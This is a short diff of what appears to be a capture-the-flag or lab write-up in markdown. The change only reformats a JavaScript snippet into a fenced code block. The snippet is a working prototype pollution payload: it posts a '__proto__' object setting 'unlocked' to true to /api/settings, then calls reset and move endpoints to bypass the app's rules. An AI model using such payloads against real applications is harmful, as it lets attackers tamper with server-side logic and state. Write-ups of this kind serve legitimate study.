@@ -199,23 +199,23 @@ fetch('/api/reset', { method: 'POST' })
 ```
 If  this  payload not  worked  try this :
 
-...
-   // Attempt 1: proto pollution flat
- fetch('/api/settings', {
-    method: 'POST',
-    headers: {'Content-Type':'application/json'},
-    body: JSON.stringify({ "__proto__": { "unlocked": true } })
-  }).then(r => r.json()).then(console.log)
-  .then(() => fetch('/api/reset', { method: 'POST' }))
-  .then(r => r.json())
-  .then(() => fetch('/api/move', {
-    method: 'POST',
-    headers: {'Content-Type':'application/json'},
-    body: JSON.stringify({from:'a1', to:'a8'})
-  }))
-  .then(r => r.json())
-  .then(console.log)
-...
+```js
+// Attempt 1: proto pollution flat
+fetch('/api/settings', {
+  method: 'POST',
+  headers: {'Content-Type':'application/json'},
+  body: JSON.stringify({ "__proto__": { "unlocked": true } })
+}).then(r => r.json()).then(console.log)
+.then(() => fetch('/api/reset', { method: 'POST' }))
+.then(r => r.json())
+.then(() => fetch('/api/move', {
+  method: 'POST',
+  headers: {'Content-Type':'application/json'},
+  body: JSON.stringify({from:'a1', to:'a8'})
+}))
+.then(r => r.json())
+.then(console.log)
+```
 
 ---
 
